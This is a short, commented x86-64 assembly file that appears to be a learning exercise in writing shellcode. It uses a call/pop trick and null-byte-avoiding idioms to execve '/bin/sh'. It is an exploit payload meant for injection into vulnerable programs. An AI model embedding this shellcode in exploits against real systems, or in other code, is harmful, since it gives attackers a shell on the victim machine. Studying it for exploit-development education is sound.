section .text
   global _start

; rax - temporary register; when we call a syscal, rax must contain syscall number
; rdi - used to pass 1st argument to functions
; rsi - pointer used to pass 2nd argument to functions
; rdx - used to pass 3rd argument to functions

; mov rax, 1 = push 1 + pop rax

shell:
	pop rdi			; Get String

	push 59			; Push 59 (execve in x86_64)
	pop rax			; into rax

	xor rsi, rsi	; Zero out rsi
	xor rdx, rdx	; Zero out rdx

	syscall			; Spawn Shell

_start:
	call shell		; Go to code with return address
	db '/bin/sh'	; of "/bin/sh" pushed onto the stack
